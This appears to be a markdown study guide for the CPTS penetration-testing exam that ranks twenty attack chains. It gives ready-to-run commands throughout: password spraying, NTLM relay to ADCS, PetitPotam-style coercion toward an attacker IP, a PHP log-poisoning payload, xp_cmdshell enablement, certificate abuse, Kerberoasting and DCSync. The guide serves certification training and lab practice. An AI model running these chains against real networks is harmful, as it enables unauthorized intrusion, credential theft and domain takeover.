# High-Probability Attack Paths

## How to Use This Document

These are the most common successful CPTS attack chains. When you're not sure what to do next, start at the top of this list and work down. Every chain is ranked by frequency, difficulty, time required, and expected payoff.

---

## Path Rankings Overview

```
RANK │ CHAIN                             │ FREQ │ DIFF │ TIME │ PAYOFF
─────┼───────────────────────────────────┼──────┼──────┼──────┼────────
#1   │ SMB Null → User Enum → Spray      │ HIGH │ LOW  │ 15m  │ Domain User
#2   │ Web Vuln → Shell → PrivEsc        │ HIGH │ LOW  │ 30m  │ OS User
#3   │ Responder → Hash → Crack → Spray  │ HIGH │ LOW  │ 20m  │ Domain User
#4   │ Credential → Sweep → Lateral      │ HIGH │ LOW  │ 10m  │ Multiple Hosts
#5   │ Domain User → BH → ACL → DA       │ HIGH │ MED  │ 1hr  │ Domain Admin
#6   │ SMB Relay → ADCS → DA             │ MED  │ MED  │ 30m  │ Domain Admin
#7   │ LFI → Log Poison → RCE → PrivEsc  │ MED  │ LOW  │ 20m  │ OS/root
#8   │ AS-REP Roast → Crack → Domain     │ MED  │ LOW  │ 15m  │ Domain User
#9   │ MSSQL → xp_cmdshell → SYSTEM      │ MED  │ LOW  │ 10m  │ SYSTEM
#10  │ Kerberoast → Crack → Lateral      │ MED  │ MED  │ 45m  │ Service Acct
#11  │ ADCS ESC1 → Cert → DA             │ MED  │ MED  │ 20m  │ Domain Admin
#12  │ NFS → SSH Keys → User → PrivEsc   │ MED  │ LOW  │ 10m  │ OS User
#13  │ Password Spray → BH → DA          │ MED  │ MED  │ 1hr  │ Domain Admin
#14  │ Linux PrivEsc → Root → SSH Keys   │ MED  │ LOW  │ 20m  │ Root
#15  │ Multi-host → Pivot → New Subnet   │ MED  │ MED  │ 30m  │ New Hosts
#16  │ Windows PrivEsc (Potato) → SYSTEM │ MED  │ LOW  │ 15m  │ SYSTEM
#17  │ SMB Share → Creds → WinRM → Admin │ MED  │ LOW  │ 15m  │ Local Admin
#18  │ LDAP Anonymous → Dump → Spray     │ LOW  │ LOW  │ 5m   │ Domain User
#19  │ Delegation Abuse → DA             │ LOW  │ HIGH │ 1hr  │ Domain Admin
#20  │ Trust Abuse → Parent Domain       │ LOW  │ HIGH │ 1hr  │ Parent Domain
```

---

## Path 1: SMB Null Session → User Enum → Password Spray

**Frequency:** VERY HIGH (SMB null session is common in CPTS)
**Difficulty:** LOW
**Time required:** 15 minutes
**Expected payoff:** Domain user credential

```
SMB port 445 open
  │
  ├── smbclient -N -L //target
  ├── rpcclient -U "" -N target enumdomusers
  └── enum4linux -a target
        │
        ▼
  Domain users obtained
        │
        ├── Spray common passwords:
        │     netexec smb DC -u users.txt -p 'CompanyName1!'
        │     netexec smb DC -u users.txt -p 'Spring2026!'
        │     netexec smb DC -u users.txt -p 'Welcome1'
        │     netexec smb DC -u users.txt -p 'Password123'
        │     netexec smb DC -u users.txt -p 'Passw0rd!'
        │
        └── Spray works → Domain User credential
              │
              └── → BloodHound → Path 5 → DA
```

**Why it works:** Most CPTS exams have SMB null session enabled. It gives you free user enumeration. Password spray with common patterns hits at least one user.

**Failover:** If spray fails → AS-REP roast (Path 8) or Responder (Path 3).

---

## Path 2: Web Vulnerability → Shell → PrivEsc

**Frequency:** VERY HIGH (web apps are the most common initial access)
**Difficulty:** LOW-MEDIUM
**Time required:** 30-60 minutes
**Expected payoff:** OS user shell

```
Web server on port 80/443
  │
  ├── Scan for vulns (content discovery + injection testing)
  │
  ├── SQLi found
  │   └── Extract DB creds → xp_cmdshell/INTO OUTFILE → Shell
  │
  ├── LFI found
  │   └── Log poison → PHP payload in User-Agent → Include log → RCE → Shell
  │
  ├── File upload found
  │   └── Upload PHP/web shell → Bypass filters → RCE → Shell
  │
  ├── Command injection found
  │   └── Reverse shell → Shell
  │
  └── Shell obtained
        │
        ├── Linux: Linux privesc → root (Path 14)
        └── Windows: Windows privesc → SYSTEM (Path 16)
              │
              └── → Check domain → AD path
```

**Why it works:** Web apps are almost always present. One of SQLi/LFI/File Upload/CMDi will work. These are the most reliable initial access vectors.

**Failover:** If no web vulns → enumerate hidden endpoints. Try ffuf with larger wordlists. Check vhosts.

---

## Path 3: Responder → Hash Capture → Crack → Spray

**Frequency:** VERY HIGH (if you run Responder, you will capture hashes)
**Difficulty:** LOW
**Time required:** 20 minutes (crack time varies)
**Expected payoff:** Domain user credential

```
Responder running on eth0/tun0 (START AT MINUTE 0)
  │
  ├── Wait for LLMNR/NBT-NS/mDNS queries
  │
  └── NetNTLMv2 hash captured
        │
        ├── Crack: hashcat -m 5600 hash.txt rockyou.txt (background)
        │   └── If cracked → Cleartext domain password
        │         │
        │         ├── BloodHound → Path 5 → DA
        │         ├── Password spray (same password) → More users
        │         └── Test on all hosts
        │
        └── [PARALLEL] Check SMB relay:
              │
              ├── If SMB signing disabled on ANY host:
              │   └── ntlmrelayx.py -tf targets.txt -smb2support
              │
              └── If ADCS present:
                    └── ntlmrelayx.py -t http://DC/certsrv -adcs
                          └── → Certificate → DA (Path 11)
```

**Why it works:** Responder captures auth attempts on the local subnet. Many CPTS hosts send LLMNR requests. Even one captured hash can lead to domain compromise.

**Failover:** No captures? Keep running. Make hosts talk to you (SCF files on writable shares, etc.).

---

## Path 4: Credential → Subnet Sweep → Lateral Movement

**Frequency:** VERY HIGH (most common follow-up to any credential find)
**Difficulty:** LOW
**Time required:** 10 minutes
**Expected payoff:** Access to additional hosts

```
Any credential found (password or hash)
  │
  ├── netexec smb <subnet>/24 -u user -p pass
  ├── netexec winrm <subnet>/24 -u user -p pass
  ├── netexec ssh <subnet>/24 -u user -p pass
  ├── netexec mssql <subnet>/24 -u user -p pass
  │
  └── Credential works on another host
        │
        ├── New host → Harvest credentials (LSASS/SAM/configs)
        ├── New host → Check domain join
        ├── New host → Check pivoting
        └── New host → Loop back to methodology
```

**Why it works:** Password reuse is the #1 vulnerability in every exam. Users and administrators reuse passwords across hosts.

**Failover:** Credential doesn't work anywhere? Try variations (different username formats, domain\user, user@domain).

---

## Path 5: Domain User → BloodHound → ACL Abuse → DA

**Frequency:** HIGH (most common DA path in CPTS)
**Difficulty:** MEDIUM
**Time required:** 1 hour
**Expected payoff:** Domain Admin

```
Any domain user credential obtained
  │
  ├── BloodHound enumeration:
  │   ├── bloodhound-python -u user -p pass -d domain -ns DC
  │   ├── SharpHound.exe (if Windows shell available)
  │   └── Upload to BloodHound for analysis
  │
  ├── Find DA path in BloodHound
  │   ├── Most common edges: ForceChangePassword, GenericAll, WriteOwner, AddMember
  │   └── Shortest path to DA analysis
  │
  └── Execute path:
        │
        ├── ACL abuse: ForceChangePassword on DA user
        │   └── net rpc password "DA_USER" "NewPass" -U "domain/user%password" -S DC
        │       └── → DA credentials
        │
        ├── ACL abuse: GenericAll on group
        │   └── Add self to Domain Admins
        │       └── → DA
        │
        ├── ACL abuse: WriteDACL
        │   └── Grant DCSync to your user → DCSync → DA
        │
        ├── ACL abuse: WriteOwner on DA user
        │   └── Change owner → Modify ACL → ForceChangePassword → DA
        │
        └── ACL abuse: AddMember on privileged group
              └── Add self to Domain Admins → DA
                    │
                    └── DCSync → KRBTGT hash → Golden Ticket
```

**Why it works:** BloodHound reliably finds ACL abuse paths. CPTS exams are designed to have these paths. The most common DA path involves ACL abuse on a user or group.

**Failover:** No ACL path → Check Kerberoast (Path 10), ADCS (Path 11), Delegation (Path 19).

---

## Path 6: SMB Relay → ADCS → DA

**Frequency:** MEDIUM (requires signing disabled + ADCS)
**Difficulty:** MEDIUM
**Time required:** 30 minutes
**Expected payoff:** Domain Admin

```
SMB signing disabled on target (nmap --script smb2-security-mode)
  │
  ├── Check for ADCS: curl http://DC/certsrv (returns page = ADCS present)
  │
  ├── Setup relay:
  │   ├── Edit Responder.conf: SMB=Off, HTTP=Off
  │   ├── sudo python3 Responder.py -I eth0
  │   └── ntlmrelayx.py -t http://DC/certsrv -smb2support -adcs
  │
  ├── Coerce auth (or wait):
  │   ├── Automatic: Responder poisons LLMNR/NBT-NS
  │   └── Manual coercion (if no traffic, FORCE auth):
  │       ├── PetitPotam: python3 PetitPotam.py -u user -p pass <attacker_ip> <target_ip>
  │       │   (Unauthenticated: python3 PetitPotam.py <attacker_ip> <target_ip>)
  │       ├── DFSCoerce: python3 dfscoerce.py -u user -p pass <attacker_ip> <target_ip>
  │       ├── PrinterBug: python3 printerbug.py domain/user:pass@<target_ip> <attacker_ip>
  │       └── ShadowCoerce: python3 shadowcoerce.py -u user -p pass <attacker_ip> <target_ip>
  │
  └── Certificate obtained
        │
        ├── certipy auth -pfx certificate.pfx -dc-ip DC -username ANYUSER -domain DOMAIN
        └── → Authenticate as DA → DCSync → Full domain
```

**Why it works:** SMB signing disabled + ADCS present = guaranteed DA in many CPTS exams. The relay-to-ADCS path (ESC8) is a common exam design pattern.

**Failover:** No ADCS → Relay to SMB for shell on a host (still valuable). Signing enabled → Use opportunistic capture only.

---

## Path 7: LFI → Log Poisoning → RCE → PrivEsc

**Frequency:** MEDIUM-HIGH (LFI is common in web apps)
**Difficulty:** LOW
**Time required:** 20 minutes
**Expected payoff:** OS user / root

```
LFI found in web app
  │
  ├── Basic file read:
  │   ├── /etc/passwd → User enumeration
  │   ├── /etc/issue → OS info
  │   └── /etc/hostname → System name
  │
  ├── Identify log path:
  │   ├── /var/log/apache2/access.log
  │   ├── /var/log/nginx/access.log
  │   └── /var/log/httpd/access_log
  │
  ├── Log poisoning:
  │   └── curl -A "<?php system($_GET['c']); ?>" http://target/
  │
  ├── Include log file via LFI:
  │   └── ?page=../../../var/log/apache2/access.log&c=id
  │
  └── RCE achieved
        │
        ├── Reverse shell upgrade
        ├── Check sudo -l (most common oversight)
        ├── SUID, capabilities, cron
        └── → Root → SSH keys → Domain? → Creds
```

**Why it works:** LFI is frequently present in CPTS web apps. Log poisoning is the most reliable LFI→RCE technique and requires no special configurations.

**Failover:** Logs not readable? Try /proc/self/environ, php://filter to read source code, php://input for direct code execution.

---

## Path 8: AS-REP Roast → Crack → Domain User

**Frequency:** MEDIUM (common but requires users without pre-auth)
**Difficulty:** LOW
**Time required:** 15 minutes
**Expected payoff:** Domain user credential

```
Kerberos port 88 open (DC present)
  │
  ├── Enumerate users (from SMB null session, Kerbrute, or LDAP)
  │
  ├── AS-REP roast:
  │   └── GetNPUsers -dc-ip DC domain/ -usersfile users.txt
  │       └── Found user without pre-auth → AS-REP hash
  │
  └── Crack: hashcat -m 18200 hash.txt rockyou.txt
        │
        └── Cracked → Domain user credential
              │
              └── → BloodHound → Path 5 → DA
```

**Why it works:** Some domain users don't have Kerberos pre-authentication enabled. This gives you a crackable hash for a domain user — no password needed to get it.

**Failover:** No AS-REP users → Try Responder (Path 3) or password spray (Path 1).

---

## Path 9: MSSQL → xp_cmdshell → SYSTEM

**Frequency:** MEDIUM (MSSQL with weak creds or default sa)
**Difficulty:** LOW
**Time required:** 10 minutes
**Expected payoff:** SYSTEM shell

```
MSSQL port 1433 open
  │
  ├── Check default credentials:
  │   ├── sa:sa, sa:admin, sa:password
  │   ├── admin:admin, sqladmin:sqladmin
  │   └── OR: credentials from config file / SQLi
  │
  ├── Connect:
  │   └── mssqlclient.py sa:pass@target
  │
  ├── Enable xp_cmdshell:
  │   ├── EXEC sp_configure 'show advanced options', 1; reconfigure;
  │   ├── EXEC sp_configure 'xp_cmdshell', 1; reconfigure;
  │   └── EXEC xp_cmdshell 'whoami';
  │
  └── SYSTEM shell
        │
        ├── Reverse shell upgrade
        ├── LSASS dump → Domain creds
        ├── Check domain join
        └── → Domain user → Path 5 → DA
```

**Why it works:** Default MSSQL credentials are common in exam environments. sa with no password or a weak password happens frequently.

**Failover:** No xp_cmdshell → Check if MSSQL runs as a high-privilege service. Try linked servers (Path extension). Try MySQL with LOAD_FILE.

---

## Path 10: Kerberoast → Crack → Service Account → Lateral

**Frequency:** MEDIUM (requires domain credentials)
**Difficulty:** MEDIUM
**Time required:** 45 minutes
**Expected payoff:** Service account credential

```
Domain user credential obtained
  │
  ├── GetUserSPNs -dc-ip DC domain/user:pass -request
  │
  ├── TGS ticket obtained
  │   └── Crack: hashcat -m 13100 ticket.txt rockyou.txt
  │       └── (slow — run in background)
  │
  └── Service account password cracked
        │
        ├── Test on service host (SMB/WinRM)
        ├── BloodHound: Is service account privileged?
        │   ├── In Domain Admins? → DA
        │   ├── In other privileged groups? → Escalation
        │   └── Service account delegation? → DA path
        └── Silver ticket for persistent access
```

**Why it works:** Kerberoastable accounts are present in most CPTS domains. Service account passwords are sometimes weak or shared.

**Failover:** TGS doesn't crack → Try different wordlists/rules. Check if service account has delegation (Path 19). Try AS-REP roast on other users.

---

## Path 11: ADCS ESC1 Certificate → Domain Admin

**Frequency:** MEDIUM (requires ADCS + misconfigured template)
**Difficulty:** MEDIUM
**Time required:** 20 minutes
**Expected payoff:** Domain Admin

```
Domain user credential obtained
  │
  ├── certipy find -u user@domain -p pass -dc-ip DC
  │
  ├── ESC1 vulnerable template found:
  │   ├── Low-priv user can enroll
  │   └── CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled (SAN)
  │
  ├── Request certificate as DA:
  │   └── certipy req -u user@domain -p pass -ca CA-SERVER -template VULN_TEMPLATE -target DC
  │
  └── Certificate for ANY user (including DA)
        │
        ├── certipy auth -pfx da.pfx -dc-ip DC -username Administrator -domain DOMAIN
        └── → Authenticated as DA → DCSync → Full domain
```

**Why it works:** ESC1 is the most common ADCS vulnerability. Any domain user can request a certificate as any other user (including DA).

**Failover:** No ESC1 → Check ESC2, ESC3, ESC8 (Path 6), ESC9, ESC10. ADCS almost always has at least one ESC misconfiguration.

---

## Path 12: NFS → SSH Keys → User Access → PrivEsc

**Frequency:** MEDIUM (NFS exports with SSH key access)
**Difficulty:** LOW
**Time required:** 10 minutes
**Expected payoff:** User shell

```
NFS port 2049 open
  │
  ├── Showmount: showmount -e target
  │
  ├── Mount readable share:
  │   └── mount -t nfs target:/share /mnt/nfs
  │
  ├── Find SSH keys:
  │   ├── .ssh/authorized_keys
  │   ├── .ssh/id_rsa
  │   └── Check home directories
  │
  └── SSH key found
        │
        ├── SSH as user → Linux privesc → root (Path 14)
        └── Key reuse → test on other hosts
```

**Why it works:** NFS exports without root_squash or with world-readable home directories expose SSH keys. This is a fast path to user access.

**Failover:** No SSH keys → Check NFS for config files, backup files, or other readable data.

---

## Path 13: Password Spray → More Users → BloodHound → DA

**Frequency:** MEDIUM (requires initial user list)
**Difficulty:** MEDIUM
**Time required:** 1 hour
**Expected payoff:** Multiple domain users → DA

```
User list obtained (SMB null session, LDAP, Kerbrute)
  │
  ├── Spray MULTIPLE passwords:
  │   ├── 'CompanyName1!' → User1 found
  │   ├── 'Spring2026!' → User2 found
  │   └── 'Passw0rd' → User3 found
  │
  ├── Multiple domain users obtained
  │
  ├── BloodHound for ALL users:
  │   └── Some users have different privileges
  │       ├── User1: ForceChangePassword on DA
  │       ├── User2: GenericAll on admin group
  │       └── User3: Member of privileged group
  │
  └── Execute most promising DA path (Path 5)
```

**Why it works:** Multiple low-privilege users often have different AD permissions. One user alone may not show a DA path, but combining data from 3+ users reveals the full picture.

**Failover:** No DA path from any user → Check Kerberoast, ADCS, Delegation.

---

## Path 14: Linux PrivEsc → Root → SSH Keys → Pivot

**Frequency:** MEDIUM-HIGH (after initial Linux shell)
**Difficulty:** LOW-MEDIUM
**Time required:** 20 minutes
**Expected payoff:** Root access

```
Shell on Linux host (non-root)
  │
  ├── sudo -l → Check ALL sudo entries
  │   └── (USER) ALL → sudo su → ROOT (MOST COMMON OVERSIGHT)
  │
  ├── SUID: find / -perm -4000 -type f 2>/dev/null
  │   └── Check with GTFOBins for escalation
  │
  ├── Capabilities: getcap -r / 2>/dev/null
  │   └── cap_setuid+ep → /usr/bin/python → escalate
  │
  ├── Cron: pspy64 (run 5 min), /etc/crontab, /etc/cron.d/*
  │   └── Writable cron script → Reverse shell as root
  │
  ├── Kernel: uname -a → searchsploit
  │   └── Kernel exploit → root (last resort, risky)
  │
  └── Root obtained
        │
        ├── /etc/shadow → Password hashes
        ├── /root/.ssh/ → SSH keys (reuse)
        ├── Check domain-join
        ├── Install pivot (multi-homed?)
        └── Config files with creds
```

**Why it works:** Linux privilege escalation is well-documented and reliable. sudo -l alone gives root in many cases.

**Failover:** No privesc → Host may not escalate. Harvest credentials and move on. Not every host escalates.

---

## Path 15: Multi-Homed Host → Pivot → New Subnet Enumeration

**Frequency:** MEDIUM (common in multi-subnet exam networks)
**Difficulty:** MEDIUM
**Time required:** 30 minutes
**Expected payoff:** Access to new hosts/subnet

```
Shell on host (Linux or Windows)
  │
  ├── ip addr / ipconfig → 2+ NICs detected
  ├── ip route / route print → Second subnet
  │
  ├── Deploy pivoting tool
  │   ├── Root → Ligolo-ng (preferred)
  │   ├── No root → Chisel
  │   └── SSH → SSHuttle
  │
  ├── Scan new subnet through pivot
  │   ├── nmap -sn <new_subnet>/24
  │   └── nmap -sV <new_host> -p-
  │
  └── New hosts discovered
        │
        ├── New DC in new subnet? → AD attack chain
        ├── New web server? → Web attack chain (Path 2)
        └── New services? → Service enumeration
              │
              └── Spray known creds against new hosts
```

**Why it works:** CPTS exams often have multiple subnets. The pivot is the gate to the rest of the network. Missing pivot = missing half the exam.

**Failover:** Can't deploy pivot? Check egress filtering rules. Try different ports (443, 53, 80). Try DNS tunneling.

---

## Path 16: Windows PrivEsc (SeImpersonate/Potato) → SYSTEM

**Frequency:** MEDIUM-HIGH (very common on Windows service accounts)
**Difficulty:** LOW
**Time required:** 15 minutes
**Expected payoff:** SYSTEM

```
Shell on Windows host (non-admin)
  │
  ├── whoami /priv → Check for SeImpersonatePrivilege
  │
  ├── If SeImpersonate:
  │   ├── JuicyPotatoNG (Windows Server 2016+)
  │   ├── PrintSpoofer (most reliable modern Windows)
  │   ├── GodPotato (Windows Server 2022)
  │   └── RoguePotato / SharpEfsPotato
  │
  └── SYSTEM obtained
        │
        ├── LSASS dump → Domain creds
        ├── SAM dump → Local admin hashes
        └── Check domain join → AD path
```

**Why it works:** Windows service accounts (IIS, MSSQL) often have SeImpersonate. Potato exploits are reliable and well-documented.

**Failover:** No SeImpersonate → Check service misconfigs, unquoted service paths, AlwaysInstallElevated, scheduled tasks.

---

## Path 17: SMB Share → Config File Creds → WinRM → Local Admin

**Frequency:** MEDIUM (SMB shares often contain config files)
**Difficulty:** LOW
**Time required:** 15 minutes
**Expected payoff:** Local admin access

```
SMB readable share found
  │
  ├── Download ALL files recursively:
  │   └── smbclient //target/share -N
  │       recurse ON
  │       prompt OFF
  │       mget *
  │
  ├── Search for credentials:
  │   ├── web.config → DB connection strings
  │   ├── .env → API keys, passwords
  │   ├── *.sql → Database backup with passwords
  │   ├── unattend.xml → Admin password
  │   ├── *.config, *.xml, *.ini → Plaintext passwords
  │   └── Groups.xml → GPP cpassword
  │
  └── Credential found
        │
        ├── Test WinRM: evil-winrm -i target -u admin -p pass
        ├── Test SMB: netexec smb target -u admin -p pass
        └── If admin → LSASS dump → Domain creds
```

**Why it works:** Configuration files with hardcoded credentials are everywhere. Developers commit them to shares, backup files, and web directories.

**Failover:** No creds in files → Check for SSH keys, password lists, or sensitive documents. Try SCF/LNK attacks for hash capture.

---

## Path 18: LDAP Anonymous → Full Dump → Spray

**Frequency:** LOW (becoming rarer but still appears)
**Difficulty:** LOW
**Time required:** 5 minutes
**Expected payoff:** Complete AD information

```
LDAP port 389 open
  │
  ├── Check anonymous bind:
  │   └── ldapsearch -x -h target -b "dc=domain,dc=local"
  │       SUCCESS → Full domain read
  │
  └── Dump everything:
        ├── ALL domain users → Password spray
        ├── Groups → DA identification, service accounts
        ├── Computers → Full host list
        └── Domain trusts → Cross-domain paths
              │
              └── → User list → Password spray (Path 1)
                    → DA path (Path 5)
```

**Why it works:** When LDAP allows anonymous binds, you get the entire AD database. This is the fastest information gathering possible.

**Failover:** No anonymous bind → Need domain credentials. Try SMB null session (Path 1) or Kerbrute.

---

## Path 19: Delegation Abuse → DA

**Frequency:** LOW (requires specific misconfigurations)
**Difficulty:** HIGH
**Time required:** 1 hour
**Expected payoff:** Domain Admin

```
Domain user credential obtained
  │
  ├── Find delegation:
  │   ├── Unconstrained: bloodhound-python -c All (UnconstrainedDelegation)
  │   ├── Constrained: findDelegation.py domain/user:pass
  │   └── RBCD: bloodhound-python -c All (AllowedToActOnBehalfOfOtherIdentity)
  │
  ├── Unconstrained:
  │   ├── Compromise the delegation host
  │   ├── Wait for DA to connect (coerce: PrinterBug)
  │   └── Steal DA TGT → DA
  │
  ├── Constrained (protocol transition):
  │   ├── getST.py -spn cifs/DC.domain domain/user:pass
  │   └── Impersonate DA → TGS for DC → DA
  │
  └── RBCD:
        ├── Create machine account
        ├── Set AllowedToActOnBehalfOfOtherIdentity
        ├── getST.py -spn cifs/DC.domain -impersonate Administrator
        └── → DA
```

**Why it works:** Delegation misconfigurations give you a direct path to DA without needing additional credentials. RBCD in particular is common in modern domains.

**Failover:** No delegation → Check ADCS (Path 11), ACL abuse (Path 5).

---

## Path 20: Trust Abuse → Parent Domain

**Frequency:** LOW (requires child domain compromise)
**Difficulty:** HIGH
**Time required:** 1 hour
**Expected payoff:** Parent domain admin

```
Child domain compromised (DA level)
  │
  ├── Enumerate trusts:
  │   ├── nltest /domain_trusts
  │   ├── Get-ADTrust -Filter *
  │   └── bloodhound-python -c All (trust edges)
  │
  ├── SID filtering not enabled?
  │   └── ExtraSID attack:
  │       ├── Get child domain SID
  │       ├── Get parent domain RID (519 = DA)
  │       └── Forge inter-realm TGT → Authenticate as parent DA
  │
  └── Parent domain access
        │
        └── DCSync → Full parent domain hashes
```

**Why it works:** When child→parent trust doesn't have SID filtering enabled, you can forge a TGT with Enterprise Admin SID and authenticate to the parent domain as DA.

**Failover:** SID filtering enabled → Check if you can use the trust for other attacks (KDC_REQ, S4U2Self across trust). Check for forest trusts.

---

## Path Selection Decision Tree

```
WHAT DO YOU HAVE RIGHT NOW?
│
├── NOTHING (no access)
│   ├── Run Responder (Path 3)
│   ├── Full nmap scan → web? → Path 2
│   ├── SMB null session? → Path 1
│   └── Check all services for anonymous access
│
├── SERVICE ACCESS (SMB/LDAP anonymous)
│   ├── SMB null session → Path 1
│   ├── LDAP anonymous → Path 18
│   └── Database open → Path 9
│
├── WEB SERVER
│   └── Web vuln hunt → Path 2
│
├── HASH (Responder/SAM/LSASS)
│   ├── PTH immediately → Path 4
│   ├── Crack in background → Path 3
│   └── Check relay → Path 6
│
├── PASSWORD (any type)
│   ├── Test everywhere → Path 4
│   ├── Domain password → Path 5
│   └── SQL password → Path 9
│
├── SHELL (Linux/Windows)
│   ├── Privesc → Path 14/16
│   ├── Cred harvest → new passwords → Path 4
│   ├── Check domain → Path 5
│   └── Check pivot → Path 15
│
├── DOMAIN USER
│   ├── BloodHound → Path 5
│   ├── Kerberoast → Path 10
│   ├── ADCS → Path 11
│   └── Delegation → Path 19
│
├── LOCAL ADMIN
│   ├── LSASS dump → Domain creds → Path 5
│   ├── SAM dump → PTH to other hosts → Path 4
│   └── Check domain join → AD attacks
│
└── DOMAIN ADMIN
    ├── DCSync → KRBTGT → Golden Ticket
    ├── Full host access → All flags
    ├── Check forest trusts → Path 20
    └── Report writing
```

---

## Cross-References

- Exam execution strategy → [exam-execution-playbook.md](exam-execution-playbook.md)
- Loot value assessment → [loot-priority-framework.md](loot-priority-framework.md)
- Credential handling → [../operator/CREDENTIAL_DECISION_TREE.md](../operator/CREDENTIAL_DECISION_TREE.md)
- Quick decision lookup → [exam-dashboard.md](exam-dashboard.md)
- Service enumeration depth → [enumeration-completeness.md](enumeration-completeness.md)
- Full methodology → [modules/](../modules/)
- Attack graph → [Module 99: Attack Graph](99-attack-graph.md)
